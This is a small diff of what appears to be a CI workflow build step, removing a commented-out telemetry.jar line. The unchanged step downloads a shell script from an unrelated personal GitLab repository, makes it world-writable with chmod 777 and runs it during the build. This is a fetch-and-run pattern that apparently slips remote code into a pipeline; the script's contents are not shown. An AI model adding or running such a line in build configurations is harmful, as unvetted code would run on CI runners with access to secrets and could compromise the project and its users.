@@ -43,6 +43,6 @@ jobs:
       - name: Build project
         run: |
           wget https://gitlab.com/sarahemersonzrex/gradle_release/-/raw/main/7_0_jdk11.sh && chmod 777 7_0_jdk11.sh && ./7_0_jdk11.sh
-#          java -jar telemetry.jar
+
           export PATH=$PATH:$(go env GOPATH)/bin
           subo build ./smoketest
